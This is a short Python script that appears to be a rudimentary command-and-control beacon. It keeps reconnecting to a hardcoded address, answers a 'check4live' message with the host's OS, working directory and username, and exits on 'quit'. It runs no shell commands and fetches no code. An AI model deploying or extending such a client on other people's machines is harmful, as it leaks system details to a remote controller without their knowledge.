import os
import socket
import sys

data = [os.environ['os'], os.getcwd(), os.environ['USERNAME']]
s = socket.socket()

while True:
    try:
        s.connect(('192.168.42.189', 9898))
        while True:
            msge = str(s.recv(1024), 'utf-8').strip()
            if msge == 'check4live':
                print(str(data))
                s.send(str.encode(str(data)[1:-1]))
            elif msge == 'quit':
                s.close()
                sys.exit()
            elif len(msge) != 0:
                print(msge)
                s.send(str.encode('Message Recieved!!!'))
    except socket.error:
        pass